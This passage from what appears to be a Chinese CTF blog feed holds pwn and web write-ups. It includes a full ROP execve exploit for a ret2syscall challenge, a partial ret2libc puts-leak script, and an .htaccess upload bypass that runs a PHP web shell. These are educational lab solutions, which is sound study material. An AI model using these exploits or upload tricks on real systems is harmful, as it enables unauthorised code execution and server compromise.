EIP: 0x8048e96 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+114<span class="token operator">></span>:    call   0x804f650 <span class="token operator">&lt;</span>gets<span class="token operator">></span><span class="token punctuation">)</span>
EFLAGS: 0x282 <span class="token punctuation">(</span>carry parity adjust zero SIGN <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span>
<span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>
   0x8048e8a <span class="token operator">&lt;</span>main+102<span class="token operator">></span>:    call   0x804f7e0 <span class="token operator">&lt;</span>puts<span class="token operator">></span>
   0x8048e8f <span class="token operator">&lt;</span>main+107<span class="token operator">></span>:    lea    eax,<span class="token punctuation">[</span>esp+0x1c<span class="token punctuation">]</span>
   0x8048e93 <span class="token operator">&lt;</span>main+111<span class="token operator">></span>:    mov    DWORD PTR <span class="token punctuation">[</span>esp<span class="token punctuation">]</span>,eax
<span class="token operator">=</span><span class="token operator">></span> 0x8048e96 <span class="token operator">&lt;</span>main+114<span class="token operator">></span>:    call   0x804f650 <span class="token operator">&lt;</span>gets<span class="token operator">></span>
   0x8048e9b <span class="token operator">&lt;</span>main+119<span class="token operator">></span>:    mov    eax,0x0
   0x8048ea0 <span class="token operator">&lt;</span>main+124<span class="token operator">></span>:    leave  
   0x8048ea1 <span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret    
   0x8048ea2:    xchg   ax,ax
Guessed arguments:
arg<span class="token punctuation">[</span>0<span class="token punctuation">]</span>: 0xffffd04c --<span class="token operator">></span> 0x3 
<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>
0000<span class="token operator">|</span> 0xffffd030 --<span class="token operator">></span> 0xffffd04c --<span class="token operator">></span> 0x3 
0004<span class="token operator">|</span> 0xffffd034 --<span class="token operator">></span> 0x0 
0008<span class="token operator">|</span> 0xffffd038 --<span class="token operator">></span> 0x1 
0012<span class="token operator">|</span> 0xffffd03c --<span class="token operator">></span> 0x0 
0016<span class="token operator">|</span> 0xffffd040 --<span class="token operator">></span> 0x1 
0020<span class="token operator">|</span> 0xffffd044 --<span class="token operator">></span> 0xffffd144 --<span class="token operator">></span> 0xffffd313 <span class="token punctuation">(</span><span class="token string">"/home/ios/rop"</span><span class="token punctuation">)</span>
0024<span class="token operator">|</span> 0xffffd048 --<span class="token operator">></span> 0xffffd14c --<span class="token operator">></span> 0xffffd321 <span class="token punctuation">(</span><span class="token string">"XDG_VTNR=7"</span><span class="token punctuation">)</span>
0028<span class="token operator">|</span> 0xffffd04c --<span class="token operator">></span> 0x3 
<span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>
Legend: code, data, rodata, value

Breakpoint 2, 0x08048e96 <span class="token keyword">in</span> main <span class="token punctuation">(</span><span class="token punctuation">)</span> at rop.c:15
15    <span class="token keyword">in</span> rop.c
</code></pre>
<h3 id="此时-esp-0xffffd030"><a href="#此时-esp-0xffffd030" class="headerlink" title="此时 esp 0xffffd030"></a>此时 esp 0xffffd030</h3><h3 id="ebp-0xffffd0b8"><a href="#ebp-0xffffd0b8" class="headerlink" title="ebp 0xffffd0b8"></a>ebp 0xffffd0b8</h3><p>因为 int v4; // [esp+1Ch] [ebp-64h]<br>所以 此时v4地址为 0xffffd04c</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ p/x 0xffffd030+0x1c
<span class="token variable">$3</span> <span class="token operator">=</span> 0xffffd04c
</code></pre>
<p>接着计算v4到ebp的距离</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ p/x 0xffffd0b8-0xffffd04c
<span class="token variable">$6</span> <span class="token operator">=</span> 0x6c
gdb-peda$ p/d 0xffffd0b8-0xffffd04c
<span class="token variable">$7</span> <span class="token operator">=</span> 108
</code></pre>
<p>可以得到v4到ebp的偏移为108 所以到ret的偏移为108+4=112<br>接着使用ROPgadget生成ropchain</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>ROPgadget --binary rop –-ropchain
</code></pre><p>找到</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python2</span>
    <span class="token comment" spellcheck="true"># execve generated by ROPgadget</span>

    <span class="token keyword">from</span> struct <span class="token keyword">import</span> pack

    <span class="token comment" spellcheck="true"># Padding goes here</span>
    p <span class="token operator">=</span> <span class="token string">''</span>

    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806eb6a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bb196</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
    p <span class="token operator">+=</span> <span class="token string">'/bin'</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0809a4ad</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806eb6a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea064</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 4</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bb196</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
    p <span class="token operator">+=</span> <span class="token string">'//sh'</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0809a4ad</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806eb6a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08054590</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0809a4ad</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080481c9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ebx ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806eb91</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ecx ; pop ebx ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding without overwrite ebx</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806eb6a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08054590</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
    p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08049421</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># int 0x80</span>
</code></pre>
<p>接着改写为exp</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> struct <span class="token keyword">import</span> pack
sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./rop'</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span>

p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806eb6a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bb196</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
p <span class="token operator">+=</span> <span class="token string">'/bin'</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0809a4ad</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806eb6a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea064</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 4</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080bb196</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop eax ; ret</span>
p <span class="token operator">+=</span> <span class="token string">'//sh'</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0809a4ad</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806eb6a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08054590</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0809a4ad</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov dword ptr [edx], eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080481c9</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ebx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806eb91</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop ecx ; pop ebx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea060</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># padding without overwrite ebx</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0806eb6a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop edx ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x080ea068</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># @ .data + 8</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08054590</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># xor eax, eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x0807b5bf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># inc eax ; ret</span>
p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;I'</span><span class="token punctuation">,</span> <span class="token number">0x08049421</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># int 0x80</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>运行成功获得shell<br><img src="/2018/06/18/bamboofox-ret2syscall/2.jpg" alt="ida1"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;程序源码&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;c&quot; data-line_number=&quot;frontend&quot; data-trim_indent=&quot;backend&quot; data-label_position=&quot;outer&quot; 
    
    </summary>
    
    
      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
    
      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
    
      <category term="CTFwiki" scheme="http://iosmosis.github.io/tags/CTFwiki/"/>
    
      <category term="ROP" scheme="http://iosmosis.github.io/tags/ROP/"/>
    
  </entry>
  
  <entry>
    <title>全国中学生网络安全技术大赛-Writeup</title>
    <link href="http://iosmosis.github.io/2018/06/12/%E5%85%A8%E5%9B%BD%E4%B8%AD%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-Writeup/"/>
    <id>http://iosmosis.github.io/2018/06/12/全国中学生网络安全技术大赛-Writeup/</id>
    <published>2018-06-12T03:10:55.000Z</published>
    <updated>2018-06-12T03:37:51.493Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>打开题目得到flag</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>Welcome
121
Welcome to msscstc!

This is your flag: flag{4f403810354870e07cb00b549cf577c9}

good luck &amp;&amp; have fun!
</code></pre><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby upload"></a>baby upload</h2><p><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/1.jpg" alt="ida1"><br>测试了没被禁用的上传点 发现上传没有任何反应 发现第三个禁用了 所以通过审查元素更改<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/2.jpg" alt="ida1"><br>根据hint提示 了解到 .htaccesss</p>
<p>上传当前目录的.htaccess 文件</p>
<p>例如内容为： AddType application/x-http-php .jpg   (上传的jpg 均以php执行)</p>
<p>把.htaccess 上传后，且上传成功后，再上传内容为一句话的jpg文件</p>
<p>所以构造上传<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/3.jpg" alt="ida1"></p>
<p><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/4.jpg" alt="ida1"><br>这里修改为.htaccess 放行<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/5.jpg" alt="ida1"></p>
<p>成功覆盖<br>接着上传jpg的小马 或者一句话<br>尝试传小马貌似有问题 这里改用post<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/6.jpg" alt="ida1"></p>
<p><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/7.jpg" alt="ida1"><br>尝试一句话<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/8.jpg" alt="ida1"><br>尝试上传<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/9.jpg" alt="ida1"><br>成功解析<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/10.jpg" alt="ida1"></p>
<p>执行find 找到flag目录<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/11.jpg" alt="ida1"><br>cat 得到flag<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/12.jpg" alt="ida1"></p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><p>这里感谢一波出题人 放出了libc<br>载入ida分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">sub_804857B</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>

  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How many?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在漏洞</span>
<span class="token punctuation">}</span>
</code></pre>
<p>之前利用思路 a*buffer+jmp esp+shellcode</p>
<p>But..</p>
<p><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/13.jpg" alt="ida1"><br>NX开启 RELRO开启<br>所以 直接写shellcode就没办法了 </p>
<p>通过leak puts_addr 找到 system binsh 的真实地址</p>
<p>Leak通过 sub_804857B() 构造循环<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/14.jpg" alt="ida1"></p>
<p>本地EXP</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true"># coding=utf-8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>

p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./pwn1'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#p = remote('45.40.195.20',23333)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span> <span class="token operator">//</span>本地libc
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./pwn1'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">//</span>leak puts_addr
puts_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804857b</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
puts<span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'puts addr = '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token punctuation">)</span> 
